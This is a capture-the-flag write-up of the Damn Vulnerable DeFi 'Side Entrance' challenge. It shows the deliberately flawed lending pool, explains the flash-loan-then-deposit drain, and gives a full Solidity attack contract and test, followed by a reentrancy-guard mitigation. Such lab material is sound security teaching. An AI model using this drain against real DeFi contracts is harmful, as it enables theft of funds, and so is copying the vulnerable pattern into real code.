# Side Entrance

# Objectives

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

# Contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}

```

# Re-entrancy Attack

[Re-entrancy](https://github.com/dibakarsutradhar/antisec/blob/566c93c215231a88040651cc6abbd4182cc472ca/blockchain/ethernaut-ctf/reentrancy/README.md?plain=1#L52)

# Analysis

This simple lending pool contract has only 3 functions.

1. `deposit()` is a simple function that allows the `msg.sender` to deposit any amount of eth into this contract and it will update the state variable `balances`.
2. `withdraw()` is an external function that allows the user to withdraw their entire balance from this contract given that they have already deposited some eth into the pool. It updates the state variable before making an external call `safeTransferETH` to the `msg.sender` makes it sort of protected from any reentrancy attack.
3. `flashLoan()` is the last function that issues loan to anyone for the any amount. It caches the current balance of the contract in a memory variable `balancedBefore`, after that it proceeds to send the requested loan amount to the `msg.sender` . Most importantly, it ensures that the callback recipient pays back the borrowed loan by comparing the contract’s balance before and after the transaction.

## Flash Loan

A flash loan is a loan that required to be repaid in the same transaction. Failure to do so will revert the whole transaction from the origin. As an example, you create a contract which will call the flashLoan contract asking for the loan, once the flashLoan contract grants you the loan, it comes back to your contract, and in the same transaction you call another contract to do something with that loan amount, once done, you repay back the loan amount to the flashLoan contract with required fees, all in one single transaction.

# AntiSec

On the surface lever, this looks like a contract that is well written and does not reveal any common vulnerabilities like reentrancy or overflows. However, if we dig deep into this contract and think creatively, we can see a pattern that can be used to exploit this contract and drain the balance.

There are two ways to send token or ETH to this contract, one is `deposit()` and another one is `flashLoan()` ’s callback function. The flashLoan function requires the contract balance to be greater than `balanceBefore` after the end of transaction, regardless of how the borrower returns the loan.

So, what if borrower uses the `flashLoan()` to borrow the loan and repay back using the `deposit()` during the same transaction? The `deposit()` will then update the contract balances and map this amount to the borrower’s address, and with that at the end of the transaction call, the current balance of the contract will be equal or more than the `balanceBefore` making the flashLoan a successful transaction. And now, the borrower can call the `withdraw` function to take out the entire borrowed amount from the contract risk freely. This is called `Cross Function Reentrancy`, which uses one or numerous functions in a contract to exploit the same contract.

# Proof of Concept

We have to write an Attack contract that will carry out the entire hack. We would need the interface of `SideEntranceLenderPool.sol` to implement this contract. We will start by setting up the `constructor` that will set up the victim contract address and attacker address.

```solidity
interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackPool {
    IPool immutable victim;
    address immutable attacker;

    constructor(address _victim, address _attacker) {
        victim = IPool(_victim);
        attacker = _attacker;
    }
}
```

As the `flashLoan` functions of the victim contract require us to implement `execute` function to receive the loan, here’s how we would do it -

```solidity
function execute() external payable {
    require(tx.origin == attacker);
    require(msg.sender == address(victim));

    victim.deposit{value: msg.value}();
}
```

We have added two require statement to make sure that the attack transaction originated from the attacker which is us, and only `SideEntranceLenderPool` contract can call into this function. Once execute function receive the flash loan, it will immediately deposit the amount into the pool so that it passes the last require check to complete the transaction.

Now we will create the attack function. Here’s how the flow will go →

1. We call attack from the AttackPool contract first
2. `attack()` calls the `flashLoan` to take out the entire pool balance as a loan
3. `flashLoan()` function sends the amount to the `execute()` in the attack contract
4. Which gives the attack contract the control of the transaction flow, and `execute()` immediately calls `deposit()` of the pool contract and deposits the entire amount.
5. Control goes back to the pool contract’s `deposit()` function and it updates the contract balance and map the amount to the attacking contract address.
6. The transaction call goes back to the `flashLoan` and it checks that the current contract balance is similar as `balanceBefore` and it decides that the loan has been repaid by the borrower.
7. Now the control of the transaction agains comes back to the attack contract and it withdraws the entire balance of the pool contract and transfers it to the attacker.

This is how the `attack()` should look like -

```solidity
function attack() external {
    victim.flashLoan(address(victim).balance);
    victim.withdraw();
    (bool success,) = attacker.call{value: address(this).balance}("");
}
```

The overall contract looks like this -

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackPool {
    IPool immutable victim;
    address immutable attacker;

    constructor(address _victim, address _attacker) {
        victim = IPool(_victim);
        attacker = _attacker;
    }

    function attack() external {
        victim.flashLoan(address(victim).balance);
        victim.withdraw();
        (bool success,) = attacker.call{value: address(this).balance}("");
    }

    function execute() external payable {
        require(tx.origin == attacker);
        require(msg.sender == address(victim));

        victim.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

To pass this challenge, we have to pass the `side-entrance.challenge.js` test. The JS could is as simple as this -

```jsx
it('Execution', async function () {
	/** CODE YOUR SOLUTION HERE */
	this.hack = await (
		await ethers.getContractFactory('AttackPool', player)
	).deploy(pool.address, player.address);

	await this.hack.attack();
});
```

And upon running the test, you should see the test is passing in the terminal.

![Challenge Pass](https://prod-files-secure.s3.us-west-2.amazonaws.com/39724ceb-e846-472b-8f8b-8f5f4cf6baf2/eed2ca0d-bb99-4ffa-a18b-07fb57ff9aec/Screenshot_2024-02-27_at_8.28.57_PM.png)

# Mitigation

It is not wise to change the lender’s balance during processing the loan when the lender verifies the correctness of the loan repayment on the base of its balance. This cross function reentrancy could be prevented by not allowing reentry during a function call by using a `nonReentrant` modifier on all functions that can change the balance of the contract.

Here’s how using `openzeppelin`'s `nonReentrant` modifier blocks the attack -

```solidity
.
.
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
.
.
contract SideEntranceLenderPool is ReentrancyGuard {
		.
		.
    function deposit() external payable nonReentrant {
    }
		.
		.
    function flashLoan(uint256 amount) external nonReentrant {
    }
}

```

Here’s how the same test run looks after that -

![Challenge Fail](https://prod-files-secure.s3.us-west-2.amazonaws.com/39724ceb-e846-472b-8f8b-8f5f4cf6baf2/ca855b91-49b5-45f1-b707-4d2f5d6658fd/Screenshot_2024-02-27_at_9.16.06_PM.png)
